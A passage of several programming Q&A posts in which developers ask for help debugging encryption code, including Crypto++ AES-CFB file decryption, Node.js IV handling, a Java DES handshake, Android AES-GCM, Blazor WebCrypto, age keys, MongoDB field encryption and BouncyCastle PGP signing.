        StringSource(reinterpret_cast&lt;const byte*&gt;(iv.data()), iv.size(), true, new HexEncoder(new FileSink(cerr)));
        cerr &lt;&lt; endl;

        CFB_Mode&lt;AES&gt;::Encryption encryption(key, key.size(), iv);      //Choosing CFB algorithm with iv


        StreamTransformationFilter filter(encryption, new FileSink(outputFileName));    //Data is encrypted and passed to output file

        size_t fileSize = inputFile.tellg();  // Get the size of the file and reset the position to 0
        inputFile.seekg(0);

        vector&lt;char&gt; fileBuffer(fileSize);              //Input contents of inputFile into buffer
        inputFile.read(fileBuffer.data(), fileSize);    

        filter.Put(reinterpret_cast&lt;const byte*&gt;(fileBuffer.data()), fileSize);   //Puts the fileBuffer content through the encryption filter
        filter.MessageEnd();    //Ends Processsing

        inputFile.close();
        outputFile.close();

        return true;

    }
    catch (const ifstream::failure&amp; e) {
        cerr &lt;&lt; &quot;File I/O error: &quot; &lt;&lt; e.what() &lt;&lt; endl;
        return false;
    }
    catch (const Exception&amp; e) {
        cerr &lt;&lt; &quot;Encryption error: &quot; &lt;&lt; e.what() &lt;&lt; endl;
        return false;

    }
}

</code></pre>
<p>The below may be useless for my problem but I will give them just in case they are useful,they are functions I used for my encryption and decryption functions(except for Constructor and Destructor)</p>
<p>This is my constructor to get the user password so that PBKDF2 can be performed during the encryption and decryption.</p>
<pre><code>Cipher::Cipher(const char* password)
{
    size_t passwordLength = strlen(password);
    storedPassword = new char[passwordLength + 1];      // Accounting for \0 char
    strcpy_s(storedPassword, passwordLength + 1 , password);    //strcpy was unsafe
}

</code></pre>
<p>This is the destructor to destroy any dangling objects and avoid memory leaks</p>
<pre><code>Cipher::~Cipher()   //Avoding memory leaks
{
    delete[] storedPassword;
    //Crypto++ manages memory interally no need to clean up objects from library
}

</code></pre>
<p>This is the function to derive the key from my given password in the constructor</p>
<pre><code>bool Cipher::deriveKeyFromPassword(const char* password, size_t passwordLength, const SecByteBlock&amp; salt)
{
    const int iterations = 10000;

    try {
        key.resize(AES::DEFAULT_KEYLENGTH);

        PKCS5_PBKDF2_HMAC&lt;SHA256&gt; PBKDF2;       //The password-based key derivation function
        PBKDF2.DeriveKey(key, key.size(), 0, reinterpret_cast&lt;const byte*&gt;(password), passwordLength, salt, salt.size(), iterations);

        //Show the derived key
        cerr &lt;&lt; &quot;Derived Key: &quot;;
        StringSource(reinterpret_cast&lt;const byte*&gt;(key.data()), key.size(), true, new HexEncoder(new FileSink(cerr)));
        cerr &lt;&lt; endl;

        return true;
    }
    catch (const Exception e)
    {
        cerr &lt;&lt; &quot;Key Derivation error: &quot; &lt;&lt; e.what() &lt;&lt; endl;
        return false;
    }
}

</code></pre>
<p>These are the two functions that generate a random Salt and a Random IV for random key Hashing and cipher text respectively , each time I encrypt a file</p>
<pre><code>SecByteBlock Cipher::generateRandomSalt()
{
    salt.resize(16); // 16 bytes
    prng.GenerateBlock(salt, salt.size());  //A single salt is generated(Function name may be misleading)
    cerr &lt;&lt; &quot;salt size: &quot; &lt;&lt; salt.size() &lt;&lt; endl;
    return salt;
}

bool Cipher::generateRandomIV()
{
    iv.resize(AES::BLOCKSIZE);      //128 bits(default)
    prng.GenerateBlock(iv, iv.size());      //A single iv is generated(Function name may be misleading)
    cerr &lt;&lt; &quot;IV size: &quot; &lt;&lt; iv.size() &lt;&lt; endl;
    return true;
}

</code></pre>
<p>This is the code in my main method to test encryption and decryption(by changing the cipher. each time)</p>
<pre><code>int main()
{
    const char* inputFileName = R&quot;(C:path.&lt;textfile&gt;.txt)&quot;;
    const char* otuputFileName = R&quot;(C:path.&lt;textfile&gt;.txt)&quot;;
    const char* password = &quot;test&quot;;

    Cipher cipher(password);

    if (cipher.decryptFile(inputFileName, otuputFileName))
    {
        cout &lt;&lt; &quot;Decryption successfull&quot; &lt;&lt; endl;
    }
    else
    {
        cerr &lt;&lt; &quot;Decryption failed&quot; &lt;&lt; endl;
    }

    return 0;
}
</code></pre>
<p>Basically when I try to decrypt the file, I seem to have a problem with passing the cipher text through the decrypt filter, as when I do that all the data inside of the file disappears.</p>
<p>I will give the entire decryption function just in case it is useful and then below show only the relevant snippet.</p>
<p>Decryption function:</p>
<pre><code>bool Cipher::decryptFile(const char* inputFileName, const char* outputFileName)
{
    try {
        ifstream inputFile(inputFileName, ios::binary);
        ofstream outputFile(outputFileName, ios::binary | ios::trunc);

        if (!inputFile.is_open() || !outputFile.is_open())
        {
            cerr &lt;&lt; &quot;Error opening files&quot; &lt;&lt; endl;
            return false;
        }

        salt.resize(16);
        iv.resize(16);
        inputFile.read(reinterpret_cast&lt;char*&gt;(salt.data()) , salt.size());
        inputFile.read(reinterpret_cast&lt;char*&gt;(iv.data()), iv.size());

        cerr &lt;&lt; &quot;Read salt: &quot;;
        StringSource(reinterpret_cast&lt;const byte*&gt;(salt.data()), salt.size(), true, new HexEncoder(new FileSink(cerr)));
        cerr &lt;&lt; endl;

        cerr &lt;&lt; &quot;Read IV: &quot;;
        StringSource(reinterpret_cast&lt;const byte*&gt;(iv.data()), iv.size(), true, new HexEncoder(new FileSink(cerr)));
        cerr &lt;&lt; endl;

        if (!deriveKeyFromPassword(storedPassword, strlen(storedPassword), salt))
        {
            cerr &lt;&lt; &quot;Key derivation failed&quot; &lt;&lt; endl;
            return false;
        }

        CFB_Mode&lt;AES&gt;::Decryption decryption(key, key.size(), iv);  //Decryption Algorithm

        StreamTransformationFilter filter(decryption, new FileSink(outputFileName));    //Decryption Filter

        //inputFile.seekg(0, ios::end);
        inputFile.seekg(salt.size() + iv.size());   //Skip salt and IV
        size_t fileSize = inputFile.tellg();    
        inputFile.seekg(0);

        vector&lt;char&gt; fileBuffer(fileSize);
        inputFile.read(fileBuffer.data(), fileSize);

        cerr &lt;&lt; &quot;size&quot; &lt;&lt; fileBuffer.size() &lt;&lt; endl;
        filter.Put(reinterpret_cast&lt;const byte*&gt;(fileBuffer.data()), fileSize);
        filter.MessageEnd();
        
        //Destory filter object
        filter.Detach(new FileSink(outputFileName));

        size_t outputSize = filter.MaxRetrievable();
        cerr &lt;&lt; &quot;size after&quot; &lt;&lt; outputSize &lt;&lt; endl;

        if (outputSize &gt; 0)
        {
            vector&lt;byte&gt; decryptedOutput(outputSize);
            filter.Get(decryptedOutput.data(), outputSize);

            // Write the decrypted data to the output file
            outputFile.write(reinterpret_cast&lt;const char*&gt;(decryptedOutput.data()), outputSize);

            cerr &lt;&lt; &quot;Data written&quot; &lt;&lt; endl;
        }
        else
        {
            cerr &lt;&lt; &quot;No data retrieved from the filter.&quot; &lt;&lt; endl;
        }

        inputFile.close();
        outputFile.close();

        return true;
    }
    catch(const ifstream::failure&amp; e)
    {
        cerr &lt;&lt; &quot;File I/O error: &quot; &lt;&lt; e.what() &lt;&lt; endl;
        return false;
    }
    catch(const Exception&amp; e)
    {
        cerr &lt;&lt; &quot;Decryption error: &quot; &lt;&lt; e.what() &lt;&lt; endl;
        return false;
    }
}
</code></pre>
<p>The problematic part is here:</p>
<pre><code>CFB_Mode&lt;AES&gt;::Decryption decryption(key, key.size(), iv);  //Decryption Algorithm

StreamTransformationFilter filter(decryption, new FileSink(outputFileName));    //Decryption Filter

//inputFile.seekg(0, ios::end);
inputFile.seekg(salt.size() + iv.size());   //Skip salt and IV
size_t fileSize = inputFile.tellg();    
inputFile.seekg(0);

vector&lt;char&gt; fileBuffer(fileSize);
inputFile.read(fileBuffer.data(), fileSize);

cerr &lt;&lt; &quot;size&quot; &lt;&lt; fileBuffer.size() &lt;&lt; endl;
filter.Put(reinterpret_cast&lt;const byte*&gt;(fileBuffer.data()), fileSize);
filter.MessageEnd();

//Destory filter object
filter.Detach(new FileSink(outputFileName));

size_t outputSize = filter.MaxRetrievable();
cerr &lt;&lt; &quot;size after&quot; &lt;&lt; outputSize &lt;&lt; endl;
</code></pre>
<p>I am creating a new decryption algorithm and a new decryption filter for the outputFileName FileSink.I then skip the salt and iv in my cipher text file(As due to the best of my understanding these are stored at the beginning of the file) and read the file size while also starting from position 0. The contents are now put in a new fileBuffer(which excludes the salt and IV) to which then I proceed to pass these contents through the filter.</p>
<p>Up to this point it was not working so I tried to destroy the filter object to flush anything stored inside. When I retrieve the size after I still get 0 though, thus I am still left with this problem.</p>
<pre><code>The output of putting a text file through encryption is as follows:
salt size: 16
IV size: 16
Derived Key: 4A68118A4B978617A7E38AAE2D91FDE6
Read salt: 42660BBE161C4E08E5DD4CBCC74CC952
Read IV: 7067030BACB4ED6F5AC0F1465383E46E
Encryption successful
</code></pre>
<p>The output of putting the new cipher file(from the previous text file) is as follows:</p>
<pre><code>Derived Key: 4A68118A4B978617A7E38AAE2D91FDE6
Read salt: 42660BBE161C4E08E5DD4CBCC74CC952
Read IV: 7067030BACB4ED6F5AC0F1465383E46E
size32
size after0
No data retrieved from the filter.
Decryption successfull
</code></pre>
<p>The salt , IV and derive key are all being passed correctly at first glance, also the size before is 32 and size after is 0 bits hinting that the data just vanishes? Ofcourse no data is retrieved from the filter, this was just my testing of the matter and the decryption is indeed successfull but there was nothing to decrypt? I am a bit lost at this stage</p>
"
"<p>I am currently attempting to recreate an Elixir function that I use for encrypting data in JavaScript:</p>
<pre><code>def encrypt(data, key) do
  iv = &quot;0123456789ABCDEF&quot;
  data = :crypto.crypto_one_time(:aes_256_cbc, key, iv, data, encrypt: true, padding: :pkcs_padding)
  Base.encode64(data)
end
</code></pre>
<pre class=""lang-js prettyprint-override""><code>function encrypt(data, key) {
  const iv = &quot;0123456789ABCDEF&quot;
  const cipher = crypto.createCipheriv(&quot;aes-256-cbc&quot;, key, iv)
  const encryptedData = cipher.update(data, 'utf8', 'base64') + cipher.final('base64')
  return encryptedData
}
</code></pre>
<p>Using both this functions, I can successfully encrypt <code>data</code> using the key <code>0123456789ABCDEF0123456789ABCDEF</code> to <code>eLh5vbl3paGUGVIio2iEIw==</code>. However, since the IV should never be hardcoded, the common practice is to prepend it before base-64 encoding the result. I can easily do this in Elixir, as shown below:</p>
<pre><code>def encrypt(data, key) do
  iv = :crypto.strong_rand_bytes(16)
  data = :crypto.crypto_one_time(:aes_256_cbc, key, iv, data, encrypt: true, padding: :pkcs_padding)
  Base.encode64(iv &lt;&gt; data)
end
</code></pre>
<p>I can't get working in JavaScript though:</p>
<pre class=""lang-js prettyprint-override""><code>function encrypt(data, key) {
  const iv = crypto.randomBytes(16)
  const cipher = crypto.createCipheriv(&quot;aes-256-cbc&quot;, key, iv)
  const encryptedData = cipher.update(data, 'utf8', 'base64') + cipher.final('base64')
  return Buffer.from(iv + Buffer.from(encryptedData, 'base64')).toString('base64')
}
</code></pre>
<p>The problem is not working with the cipher, but getting the buffers compatible with each other. Any ideas how to achieve this?</p>
"
"<p>I know I am doing something obviously wrong but I cannot figure it out. Basically, I am creating a client that sends its name and nonce to the server. The server should read this, then send back to the client its own nonce, plus an encryption of its own name using. Once the client receives that, it will send to the server its own encryption of its name to the server to decrypt. The problem I am having is that the server is not receiving the first input form the client, before any encryption happens. Below I have included the code for the sever, (named Bob) and the client, (named Alice). I know that the client connects to the server properly, but after that it cannot read the input.</p>
<pre><code>import javax.crypto.*;
import javax.crypto.spec.*;
import java.io.*;
import java.net.*;
import java.security.*;
import java.util.Arrays;

public class Bob {
    public static void main(String[] args) throws Exception {

        String Bobidentity = &quot;Bob&quot;;
        
        // Start listening for incoming connections
        int portNumber = 1500;

        ServerSocket serverSocket = new ServerSocket(portNumber);
        System.out.println(&quot;Bob waiting for Alice...&quot;);

        // Accept Alice's connection
        Socket socket = serverSocket.accept();
        System.out.println(&quot;Alice connected.&quot;);

        // Get input/output streams
        ObjectInputStream in = new ObjectInputStream(socket.getInputStream());
        ObjectOutputStream out = new ObjectOutputStream(socket.getOutputStream());

        // Receive identity and nonce from Alice
        String aliceIdentity = (String) in.readObject();
        int aliceNonce = in.readInt();

        System.out.println(&quot;Received Alice Identity (1) &quot; + aliceIdentity);
        System.out.println(&quot;Received Alice Nonce (1) &quot; + aliceNonce);


        int bobNonce = 3;

        // Send nonce to Alice
        out.writeInt(bobNonce);

        // Generate shared secret key using both nonces
        byte[] sharedSecretBytes = (Integer.toString(bobNonce) + Integer.toString(aliceNonce)).getBytes();
        SecretKey secretKey = new SecretKeySpec(sharedSecretBytes, &quot;DES&quot;);

        // Encrypt and send message to Alice containing Bob's identity and nonce NA
        byte[] messageToAlice = (Bobidentity + &quot;,&quot; + aliceNonce).getBytes();
        Cipher cipher = Cipher.getInstance(&quot;DES/ECB/PKCS5Padding&quot;);
        cipher.init(Cipher.ENCRYPT_MODE, secretKey);
        byte[] encryptedMessage = cipher.doFinal(messageToAlice);
        out.writeObject(encryptedMessage);

        // Receive encrypted message from Alice containing Alice's identity and nonce NB
        byte[] encryptedResponse = (byte[]) in.readObject();

        System.out.println(&quot;Encrypted message from Alice (3) &quot; + Arrays.toString(encryptedResponse));

        byte[] decryptedResponse = cipher.doFinal(encryptedResponse);
        String[] parts = new String(decryptedResponse).split(&quot;,&quot;);
        String aliceIdentityReceived = parts[0];
        int receivedNonce = Integer.parseInt(parts[1]);

        System.out.println(&quot;Decrypted Identity from Alice (3) &quot; + aliceIdentityReceived);
        System.out.println(&quot;Decrypted Nonce from Alice (3) &quot; + receivedNonce);



        // Close the connection
        socket.close();
        serverSocket.close();
    }
}
</code></pre>
<pre><code>import javax.crypto.*;
import javax.crypto.spec.*;
import java.io.*;
import java.net.*;
import java.security.*;
import java.util.Arrays;

public class Alice {
    public static void main(String[] args) throws Exception {
        // Connect to Bob

        String hostName = &quot;localhost&quot;;
        int portNumber = 1500;

        //Socket socket = new Socket(&quot;localhost&quot;, 12345);
        try (
            Socket socket = new Socket(hostName, portNumber);
        ) {

            ObjectOutputStream outt = new ObjectOutputStream(socket.getOutputStream());

            int nonce = 5;
            String identity = &quot;Alice&quot;;

            // Send identity and nonce to Bob
            outt.writeObject(identity);
            outt.writeInt(nonce);

            // Receive nonce and encrypted message from Bob
            ObjectInputStream inn = new ObjectInputStream(socket.getInputStream());

                int receivedNonce = inn.readInt();
                byte[] encryptedMessage = (byte[]) inn.readObject();

                System.out.println(&quot;Encrypted message from Bob (2) &quot; + Arrays.toString(encryptedMessage));
                System.out.println(&quot;Bobs Nonce (2) &quot; + receivedNonce);

                // Generate shared secret key using both nonces
                byte[] sharedSecretBytes = (Integer.toString(nonce) + Integer.toString(receivedNonce)).getBytes();
                SecretKey secretKey = new SecretKeySpec(sharedSecretBytes, &quot;DES&quot;);

                // Decrypt and extract Bob's identity and nonce NA
                Cipher cipher = Cipher.getInstance(&quot;DES/ECB/PKCS5Padding&quot;);
                cipher.init(Cipher.DECRYPT_MODE, secretKey);
                byte[] decryptedMessage = cipher.doFinal(encryptedMessage);
                String[] parts = new String(decryptedMessage).split(&quot;,&quot;);
                String bobIdentity = parts[0];
                int bobNonce = Integer.parseInt(parts[1]);

                System.out.println(&quot;Decrypted Bobs identity (2) &quot; + bobIdentity);
                System.out.println(&quot;Decrypted nonce (2) &quot; + bobNonce);


                // Send encrypted message to Bob containing Alice's identity and nonce NB
                byte[] messageToBob = (identity + &quot;,&quot; + receivedNonce).getBytes();
                byte[] encryptedResponse = cipher.doFinal(messageToBob);
                outt.writeObject(encryptedResponse);
                // Close the connection


        }
        catch (UnknownHostException e) {
            System.err.println(&quot;Don't know about host &quot; + hostName);
            System.exit(1);
        } catch (IOException e) {
            System.err.println(&quot;Couldn't get I/O for the connection to &quot; +
                    hostName);
            System.exit(1);
        }

    }
}
</code></pre>
"
"<p>I'm trying to get the data decoded using Node native methods, I search how to achieve this but it get <strong>invalid iv initialization</strong> or <strong>Unsupported state or unable to authenticate data</strong> trying differents iv</p>
<ol>
<li>aes-128 -&gt;  16 bytes</li>
</ol>
<p>it results in -&gt;</p>
<blockquote>
<p>{  &quot;statusCode&quot;: 500,
&quot;message&quot;: &quot;Invalid initialization vector&quot; }</p>
</blockquote>
<pre><code>let decoded: string = '';
for (let ndx = 0; ndx &lt; hash.length; ndx += 2) {
  let i = parseInt('0x' + hash.substring(ndx, ndx + 2));
  decoded += String.fromCharCode(i);
}

try {
  const password = 'somePassword';
  const key = crypto.scryptSync(password, 'salt', 16);
  const iv = Buffer.alloc(11, password, 'ascii'); // Initialization vector.
  const iv2 = crypto.randomBytes(32)
  const iv3 = iv2.toString('hex').slice(0, 16);
  const iv4 = Buffer.allocUnsafe(32)
  const decipher = crypto.createDecipheriv('aes-128-gcm', key, iv);

  let decrypted = decipher.update(decoded, 'ascii', 'utf8');
  decrypted += decipher.final('utf8');
</code></pre>
<p>I'tried many iv but all of them results in -&gt;</p>
<blockquote>
<p>Unsupported state or unable to authenticate data</p>
</blockquote>
"
"<p>I am building a class in Android Studio which is responsible for encrypting and decrypting contents of files.</p>
<p>The issue is that whenever I try to decrypt a file (i.e. the data of the byte[] parameter of the decrypt() method excluding the IV) the following exception is raised at</p>
<pre><code>// last line of decrypt method
return cipher.doFinal(encrypted);
</code></pre>
<p>As far as I read, &quot;This exception is thrown when a <a href=""https://docs.oracle.com/javase/8/docs/api/javax/crypto/Cipher.html"" rel=""nofollow noreferrer"" title=""class in javax.crypto""><code>Cipher</code></a> operating in an AEAD mode (such as GCM/CCM) is unable to verify the supplied authentication tag.&quot;.</p>
<p>I'm pretty sure that the key, the IV and the encrypted text are matching in the encryption and the decryption methods (according to the results of the Log statements).</p>
<p>Does someone have an idea where the problem may lay in?<br />
This is the class:</p>
<pre><code>package elsys.project;

import android.security.keystore.KeyGenParameterSpec;
import android.security.keystore.KeyProperties;
import android.util.Log;

import java.nio.charset.StandardCharsets;
import java.security.KeyStore;
import java.security.SecureRandom;
import java.util.Arrays;
import java.util.Random;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;

public class EncryptionAndDecryption {
    private static byte[] IV;
    private static SecretKey SECRET_KEY;
    private static String alias;
    private static byte[] EncryptedData;
    public static byte[] encrypt(String text, String secretKeyAlias) throws Exception{
        try {
            alias = secretKeyAlias;
            generateKeyIfNotAvailable(secretKeyAlias);

            KeyStore keyStore = KeyStore.getInstance(&quot;AndroidKeyStore&quot;);
            keyStore.load(null);
            SecretKey secretKey = (SecretKey) keyStore.getKey(secretKeyAlias, null);

            Log.d(&quot;encryption&quot;, (secretKey == null) + &quot;&quot;);

            Cipher cipher = Cipher.getInstance(&quot;AES/GCM/NoPadding&quot;);
            cipher.init(Cipher.ENCRYPT_MODE, secretKey);

            byte[] encryptedData = cipher.doFinal(text.getBytes(StandardCharsets.UTF_8));
            EncryptedData = encryptedData;

            byte[] iv = new byte[12];
            IV = iv;
            SECRET_KEY = secretKey;
            Random random = new Random();
            random.nextBytes(iv);

            byte[] fileContent = new byte[iv.length + encryptedData.length];
            System.arraycopy(iv, 0, fileContent, 0, iv.length);
            System.arraycopy(encryptedData, 0, fileContent, iv.length, encryptedData.length);
            return fileContent;
        } catch (Exception e) {
            Log.d(&quot;encryption&quot;, e.toString());
            e.printStackTrace();
            return null;
        }
    }

    public static byte[] decrypt(byte[] fileContent, String secretKeyAlias) {
        try {
            Log.d(&quot;decryption&quot;, (secretKeyAlias.equals(alias)) + &quot; 1&quot;);

            KeyStore keyStore = KeyStore.getInstance(&quot;AndroidKeyStore&quot;);
            keyStore.load(null);
            SecretKey secretKey = (SecretKey) keyStore.getKey(secretKeyAlias, null);

            Log.d(&quot;decryption&quot;, (secretKey == null) + &quot; 2&quot;);
            Log.d(&quot;decryption&quot;, (SECRET_KEY == null) + &quot; 3&quot;);

            Log.d(&quot;decryption&quot;, SECRET_KEY.equals(secretKey) + &quot; 4&quot;);

            byte[] iv = new byte[12];
            System.arraycopy(fileContent, 0, iv, 0, 12);

            Log.d(&quot;decryption&quot;, Arrays.equals(IV, iv) + &quot; 5&quot;);

            byte[] encrypted = new byte[fileContent.length - 12];
            System.arraycopy(fileContent, 12, encrypted, 0, encrypted.length);

            Log.d(&quot;decryption&quot;, Arrays.equals(encrypted, EncryptedData) + &quot; 6&quot;);

            Cipher cipher = Cipher.getInstance(&quot;AES/GCM/NoPadding&quot;);
            cipher.init(Cipher.DECRYPT_MODE, secretKey, new GCMParameterSpec(128, iv));

            return cipher.doFinal(encrypted);
        } catch (Exception e) {
            Log.d(&quot;decryption&quot;, e.toString());
            e.printStackTrace();
            return null;
        }
    }

    private static void generateKeyIfNotAvailable(String secretKeyAlias) throws Exception {
        KeyStore keyStore = KeyStore.getInstance(&quot;AndroidKeyStore&quot;);
        keyStore.load(null);

        // Check if key exists, if not, generate a new one
        if (!keyStore.containsAlias(secretKeyAlias)) {
            KeyGenerator keyGenerator = KeyGenerator.getInstance(
                    KeyProperties.KEY_ALGORITHM_AES, &quot;AndroidKeyStore&quot;);

            KeyGenParameterSpec.Builder builder = new KeyGenParameterSpec.Builder(
                    secretKeyAlias,
                    KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT);

            builder.setBlockModes(KeyProperties.BLOCK_MODE_GCM)
                    .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
                    .setUserAuthenticationRequired(false);

            keyGenerator.init(builder.build());
            keyGenerator.generateKey();
        }
    }
}
</code></pre>
<p>I tried using different values for the authentication tag's size but that didn't work.</p>
"
"<p>I'm having some issues when I try to decrypt a string in c# wasm using js interop. I'm new to encryption/decryption so I am unsure of what the error is actually saying. I have stepped through my code and logged the keys, iv and other items and seems they are the proper values.</p>
<p>Here is the code I have.</p>
<p>Blazor page</p>
<p>Encryption.razor</p>
<pre><code>&lt;div class=&quot;input-container&quot;&gt;
    &lt;label for=&quot;plainText&quot;&gt;Input string&lt;/label&gt;
    &lt;div class=&quot;input-wrapper&quot;&gt;
        &lt;input id=&quot;plainText&quot; type=&quot;text&quot; @bind=&quot;plainText&quot; title=&quot;Input string&quot; /&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;div class=&quot;button-container&quot;&gt;
    &lt;button @onclick=&quot;Encrypt&quot; class=&quot;button-style button-one&quot;&gt;Encrypt&lt;/button&gt;
    &lt;button @onclick=&quot;Decrypt&quot; class=&quot;button-style&quot;&gt;Decrypt&lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;input-container&quot;&gt;
    &lt;label for=&quot;encryptedMessage&quot;&gt;Encrypted/Decrypted Message&lt;/label&gt;
    &lt;div class=&quot;input-wrapper&quot;&gt;
        &lt;input id=&quot;encryptedMessage&quot; type=&quot;text&quot; @bind=&quot;encryptedMessage&quot; /&gt;
    &lt;/div&gt;
&lt;/div&gt;

@code {
    private string plainText = &quot;&quot;;
    private string encryptedMessage = &quot;&quot;;
    private string keyBase64 = &quot;&quot;;
    private string ivBase64 = &quot;&quot;;

    // Method to generate a key and IV
    private async Task GenerateKeyAndIV()
    {
        keyBase64 = await JSRuntime.InvokeAsync&lt;string&gt;(&quot;generateKey&quot;);
        ivBase64 = await JSRuntime.InvokeAsync&lt;string&gt;(&quot;generateIV&quot;);
    }

    private async Task Encrypt()
    {
        await GenerateKeyAndIV();
        encryptedMessage = await encryptionService.Encrypt(plainText, keyBase64, ivBase64);
    }

    private async Task Decrypt()
    {
        await GenerateKeyAndIV();
        plainText = await encryptionService.Decrypt(encryptedMessage, keyBase64, ivBase64);
    }

    // Call GenerateKeyAndIV when the component is initialized
    protected override async Task OnInitializedAsync()
    {
        await GenerateKeyAndIV();
    }
</code></pre>
<p>EncryptionService.cs</p>
<pre><code>using Microsoft.JSInterop;
using System.Threading.Tasks;

public class EncryptionService
{
    private readonly IJSRuntime _jsRuntime;

    public EncryptionService(IJSRuntime jsRuntime)
    {
        _jsRuntime = jsRuntime;
    }

    public async Task&lt;string&gt; Encrypt(string text, string keyBase64, string iv)
    {
        return await _jsRuntime.InvokeAsync&lt;string&gt;(&quot;encryptText&quot;, text, keyBase64, iv);
    }

    public async Task&lt;string&gt; Decrypt(string encryptedBase64, string keyBase64, string iv)
    {
        return await _jsRuntime.InvokeAsync&lt;string&gt;(&quot;decryptText&quot;, encryptedBase64, keyBase64, iv);
    }
}
</code></pre>
<p>index.html scripts</p>
<pre><code>&lt;script&gt;
      window.generateKey = async () =&gt; {
          const key = await crypto.subtle.generateKey(
              { name: 'AES-GCM', length: 128 },
              true,
              ['encrypt', 'decrypt']
          );
          const keyBytes = await crypto.subtle.exportKey('raw', key);
          return btoa(String.fromCharCode.apply(null, new Uint8Array(keyBytes)));
      };
&lt;/script&gt; 

&lt;!-- Function to generate IV --&gt;
&lt;script&gt;
window.generateIV = async () =&gt; {
    const iv = crypto.getRandomValues(new Uint8Array(12));
    return btoa(String.fromCharCode.apply(null, iv));
};
&lt;/script&gt;

&lt;!-- Function to encrypt text using AES-GCM algorithm --&gt;
&lt;script&gt;
  async function encryptText(text, keyBase64, ivBase64) {
      const iv = new Uint8Array(atob(ivBase64).split('').map(char =&gt; char.charCodeAt(0)));
      const keyBytes = new Uint8Array(atob(keyBase64).split('').map(char =&gt; char.charCodeAt(0)));
      const encodedText = new TextEncoder().encode(text);
      const encodedKey = await crypto.subtle.importKey(&quot;raw&quot;, keyBytes, &quot;AES-GCM&quot;, false, [&quot;encrypt&quot;]);
      const encryptedBytes = await crypto.subtle.encrypt({ name: &quot;AES-GCM&quot;, iv }, encodedKey, encodedText);
      return btoa(String.fromCharCode.apply(null, new Uint8Array(encryptedBytes)));
  }
&lt;/script&gt;

&lt;!-- Function to decrypt text using AES-GCM algorithm --&gt;
&lt;script&gt;
  async function decryptText(encryptedBase64, keyBase64, ivBase64) {
      const iv = new Uint8Array(atob(ivBase64).split('').map(char =&gt; char.charCodeAt(0)));
      const keyBytes = new Uint8Array(atob(keyBase64).split('').map(char =&gt; char.charCodeAt(0)));
      const encryptedBytes = new Uint8Array(atob(encryptedBase64).split('').map(char =&gt; char.charCodeAt(0)));
      const importedKey = await crypto.subtle.importKey(&quot;raw&quot;, keyBytes, &quot;AES-GCM&quot;, false, [&quot;decrypt&quot;]);
      const decryptedBytes = await crypto.subtle.decrypt({ name: &quot;AES-GCM&quot;, iv }, importedKey, encryptedBytes);
      return new TextDecoder().decode(decryptedBytes);
  }
&lt;/script&gt;

</code></pre>
<p>I have logged the values and they seem correct. I have tried consulting chatGPT on the error but it doesn't specificy what exactly the issue is in the decrypt function.</p>
<p><a href=""https://i.stack.imgur.com/ndV2L.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/ndV2L.png"" alt=""error msg"" /></a></p>
"
"<p>Age is a practical toos for file encryption, here it is its presentation page: <a href=""https://github.com/FiloSottile/age"" rel=""nofollow noreferrer"" title=""https://github.com/FiloSottile/age"">age</a>.</p>
<p>With <code>age-keygen</code>, we are going to be able to create a couple of public key and private key together like below:</p>
<pre><code># created: 2024-02-14T17:14:05+01:00
# public key: age1zskjrcgkgqhjaksa22ze85wy0wy2xg8sf7j8fntdgz2d4h25rp9sz76q7p
AGE-SECRET-KEY-1SA9KV6M7C27GFW22ZXED69SAATLH3UMDUSN720AQR0JEN2YTU0MS7FFZA2
</code></pre>
<p>Where we are going to have a pair of public key and private key (<code>AGE-SECRET-KEY-...</code>). We can use these information for encryption and decryption, no problem.</p>
<p>But what bothers me is that I haven't found a way to verify whether the public key and the private key of age couple. A similar example in openssl is below:</p>
<pre><code>openssl x509 -in cert.pem -noout -modulus | openssl md5
openssl rsa -in key.pem -noout -modulus | openssl md5
</code></pre>
<p>If the results generated are identical, we are going to be able to verify that <code>cert.pem</code> and <code>key.pem</code> are a pair. How can we achieve the similar functionality for age keys?</p>
<p>Thanks in advance!</p>
"
"<p>The basic document schema we are using resembles</p>
<pre class=""lang-json prettyprint-override""><code>{
  &quot;_id&quot;: &quot;3fa85f64-5717-4562-b3fc-2c963f66afa6&quot;,
  &quot;usage&quot;: {
    &quot;2024-01-01&quot;: {
      &quot;param01&quot;: 123,
      &quot;param02&quot;: 456
    },
    &quot;2024-01-02&quot;: {
      &quot;param01&quot;: 789,
      &quot;param02&quot;: 147
    }
  }
}
</code></pre>
<p>We require the <code>usage</code> field to be encrypted.</p>
<p>Using the <code>MongoDB.Driver</code> to encrypt the field directly fails as there is no conversion available to the <code>BsonValue</code> base class passed into <code>ClientEncryption.Encrypt</code> from <code>Dictionary&lt;&gt;</code>.</p>
<p>The current solution uses an intermediate serialisation of <code>usage</code> to JSON prior to encryption.</p>
<pre class=""lang-cs prettyprint-override""><code>var encryptedUsage = _clientEncryption.Encrypt(
        JsonSerializer.Serialize(usageData.Usage),
        new EncryptOptions(algorithm: &quot;AEAD_AES_256_CBC_HMAC_SHA_512-Random&quot;, keyId: _dataEncryptionKeyId));
</code></pre>
<p>Is there a more elegant solution that would enable a Dictionary&lt;&gt; to be encrypted  and decrypted without an inline JSON intermediate step?</p>
<p>Could an implicit operator be utilised to take the Dictionary&lt;&gt; or a custom class and convert it to a type derived from <code>BsonValue</code>?</p>
<p>Could the same be done to facilitate a strongly typed document for the auto-decryption when reading?</p>
<p>We have little experience in this area and are unsure of the available options.</p>
"
"<p>I want to encrypt / decrypt file using Java and GNUPG utility. I am trying to encrypt the file in Java using bouncycastle library and later on want to decrypt using GNUPG to make sure encryption / decryption process works fine.</p>
<p>Using gnupg, I have created the public and private keys using RSA 2048.</p>
<p>The encryption works fine and I am able to decrypt it but when I am signing (with my private key) and encrypting it(with recipient public key) and later on tries to decrypt using GNUPG utility, I am getting the following error</p>
<p>gpg: old style (PGP 2.x) signature <br />
gpg: can't handle this ambiguous signature data</p>
<p>Is there a version mismatch using bounty castle library and GNUPG and is there any alternative in Java to sign/encrypt using GNUPG ?</p>
<pre><code>  public void encrypt(OutputStream encryptOut, InputStream clearIn, long length, InputStream publicKeyIn)
      throws IOException, PGPException {
    String signingPrivateKeyPassword = &quot;password&quot;;
    PGPCompressedDataGenerator compressedDataGenerator =
